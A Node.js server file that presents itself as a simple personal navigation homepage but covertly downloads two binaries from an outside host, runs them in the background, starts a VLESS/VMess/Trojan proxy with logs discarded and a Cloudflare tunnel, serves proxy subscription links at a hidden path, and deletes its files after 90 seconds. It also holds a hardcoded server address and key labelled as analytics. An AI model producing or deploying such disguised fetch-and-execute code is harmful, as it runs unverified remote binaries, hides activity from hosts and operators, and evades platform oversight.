const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

// ========== 1. 基础配置 ==========
const SITE_NAME = process.env.SITE_NAME || '我的个人导航'; // 对应网页标题
const SITE_ID = process.env.SITE_ID || 'c3ae8a27-4c40-4d25-9f4c-bb2cba6ca674';
const SITE_DIR = process.env.SITE_DIR || './tmp';
const FEED_PATH = process.env.FEED_PATH || 'qianxiuadmin';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

// 统计分析配置
const ANALYTICS_SERVER = process.env.ANALYTICS_SERVER || 'jk.zenova.de5.net:8008';
const ANALYTICS_PORT = process.env.ANALYTICS_PORT || '';
const ANALYTICS_KEY = process.env.ANALYTICS_KEY || 'nfZkxIKilkI9lMpFvAD46F8HdA3ci12f';

// Argo配置
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = process.env.ARGO_PORT || 8010;
const CDN_HOST = process.env.CDN_HOST || 'cdns.doon.eu.org';
const CDN_PORT = process.env.CDN_PORT || 443;

// ========== 2. 你的个人导航 HTML 模板 ==========
const NAV_HTML = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${SITE_NAME} - 简洁高效</title>
    <style>
        :root {
            --bg-color: #f4f7f9;
            --card-bg: #ffffff;
            --text-main: #333;
            --text-sub: #666;
            --accent-color: #3b82f6;
            --hover-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #111827;
                --card-bg: #1f2937;
                --text-main: #f3f4f6;
                --text-sub: #9ca3af;
            }
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            line-height: 1.6;
            padding: 20px;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        header { text-align: center; padding: 40px 0; }
        .search-box { margin-top: 20px; position: relative; max-width: 500px; margin-left: auto; margin-right: auto; }
        .search-box input {
            width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid transparent;
            background: var(--card-bg); box-shadow: var(--hover-shadow); color: var(--text-main);
            outline: none; transition: var(--transition);
        }
        .search-box input:focus { border-color: var(--accent-color); }
        .category-title { margin: 30px 0 15px; font-size: 1.2rem; display: flex; align-items: center; font-weight: 600; }
        .category-title::before { content: ""; width: 4px; height: 1.2rem; background: var(--accent-color); margin-right: 10px; border-radius: 2px; }
        .nav-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
        .nav-card {
            background: var(--card-bg); padding: 15px; border-radius: 12px; text-decoration: none;
            color: inherit; display: flex; align-items: center; transition: var(--transition);
            border: 1px solid rgba(0,0,0,0.05);
        }
        .nav-card:hover { transform: translateY(-3px); box-shadow: var(--hover-shadow); border-color: var(--accent-color); }
        .nav-card img { width: 32px; height: 32px; margin-right: 12px; border-radius: 6px; background: #eee; }
        .nav-card .info { overflow: hidden; }
        .nav-card .name { display: block; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .nav-card .desc { font-size: 0.75rem; color: var(--text-sub); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        footer { text-align: center; margin-top: 50px; padding: 20px; font-size: 0.8rem; color: var(--text-sub); }
        @media (max-width: 480px) { .nav-grid { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
<div class="container">
    <header>
        <h1>${SITE_NAME}</h1>
        <div class="search-box">
            <form action="https://www.google.com/search" method="get" target="_blank">
                <input type="text" name="q" placeholder="搜索一下..." autocomplete="off">
            </form>
        </div>
    </header>
    <div class="category-title">常用工具</div>
    <div class="nav-grid">
        <a href="https://github.com" class="nav-card" target="_blank">
            <img src="https://github.com/favicon.ico" alt="Icon">
            <div class="info"><span class="name">GitHub</span><span class="desc">代码托管平台</span></div>
        </a>
        <a href="https://v2ex.com" class="nav-card" target="_blank">
            <img src="https://v2ex.com/static/favicon.ico" alt="Icon">
            <div class="info"><span class="name">V2EX</span><span class="desc">创意工作者社区</span></div>
        </a>
        <a href="https://chatgpt.com" class="nav-card" target="_blank">
            <img src="https://chatgpt.com/favicon.ico" alt="Icon">
            <div class="info"><span class="name">ChatGPT</span><span class="desc">AI 助手</span></div>
        </a>
    </div>
    <div class="category-title">影音娱乐</div>
    <div class="nav-grid">
        <a href="https://www.youtube.com" class="nav-card" target="_blank">
            <img src="https://www.youtube.com/favicon.ico" alt="Icon">
            <div class="info"><span class="name">YouTube</span><span class="desc">视频网站</span></div>
        </a>
        <a href="https://www.bilibili.com" class="nav-card" target="_blank">
            <img src="https://www.bilibili.com/favicon.ico" alt="Icon">
            <div class="info"><span class="name">Bilibili</span><span class="desc">干杯 ~</span></div>
        </a>
    </div>
    <footer>
        <p>&copy; ${new Date().getFullYear()} ${SITE_NAME}.</p>
    </footer>
</div>
<script>
    const searchInput = document.querySelector('.search-box input');
    searchInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter' && this.value === '') { e.preventDefault(); }
    });
</script>
</body>
</html>
`;

// ========== 3. 文件及环境管理 ==========
if (!fs.existsSync(SITE_DIR)) fs.mkdirSync(SITE_DIR);

function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
  return result;
}

const webName = generateRandomName(), botName = generateRandomName(), phpName = generateRandomName(), npmName = generateRandomName();
let webPath = path.join(SITE_DIR, webName), botPath = path.join(SITE_DIR, botName);
let phpPath = path.join(SITE_DIR, phpName), npmPath = path.join(SITE_DIR, npmName);
let bootLogPath = path.join(SITE_DIR, 'boot.log'), configPath = path.join(SITE_DIR, 'config.json'), subPath = path.join(SITE_DIR, 'sub.txt');

// ========== 4. 路由服务 ==========
app.get("/", (req, res) => { res.send(NAV_HTML); });

// ========== 5. 核心逻辑 (后台代理服务) ==========
async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: SITE_ID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: SITE_ID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: SITE_ID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: SITE_ID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: SITE_ID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } } },
    ],
    outbounds: [{ protocol: "freedom", tag: "direct" }]
  };
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

async function downloadFilesAndRun() {
  const arch = (os.arch() === 'arm64' || os.arch() === 'aarch64') ? 'arm64' : 'amd64';
  const baseUrl = `https://${arch}.ssss.nyc.mn`;
  
  const files = [
    { name: webPath, url: `${baseUrl}/web` },
    { name: botPath, url: `${baseUrl}/bot` }
  ];

  for (const file of files) {
    const response = await axios({ method: 'get', url: file.url, responseType: 'stream' });
    response.data.pipe(fs.createWriteStream(file.name));
    await new Promise(resolve => response.data.on('end', resolve));
    fs.chmodSync(file.name, 0o775);
  }

  // 启动服务
  exec(`nohup ${webPath} -c ${configPath} >/dev/null 2>&1 &`);
  
  let argoArgs = ARGO_AUTH.length > 120 
    ? `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`
    : `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${bootLogPath} --loglevel info --url http://localhost:${ARGO_PORT}`;
  
  exec(`nohup ${botPath} ${argoArgs} >/dev/null 2>&1 &`);
}

async function extractDomains() {
  const checkArgo = setInterval(() => {
    if (fs.existsSync(bootLogPath)) {
      const content = fs.readFileSync(bootLogPath, 'utf-8');
      const match = content.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
      if (match) {
        clearInterval(checkArgo);
        generateLinks(match[1]);
      }
    }
  }, 3000);
}

function generateLinks(argoDomain) {
  const VMESS = { v: '2', ps: SITE_NAME, add: CDN_HOST, port: CDN_PORT, id: SITE_ID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, fp: 'firefox'};
  const subTxt = `vless://${SITE_ID}@${CDN_HOST}:${CDN_PORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${SITE_NAME}\nvmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}`;
  
  app.get(`/${FEED_PATH}`, (req, res) => {
    res.set('Content-Type', 'text/plain; charset=utf-8');
    res.send(Buffer.from(subTxt).toString('base64'));
  });
}

// 自动清理
function cleanFiles() {
  setTimeout(() => {
    [bootLogPath, configPath, webPath, botPath].forEach(f => {
      try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch(e) {}
    });
  }, 90000);
}

// ========== 6. 启动主程序 ==========
async function main() {
  await generateConfig();
  await downloadFilesAndRun();
  await extractDomains();
  cleanFiles();
}

main().catch(console.error);
app.listen(PORT, () => console.log(`Nav Server: http://localhost:${PORT}`));
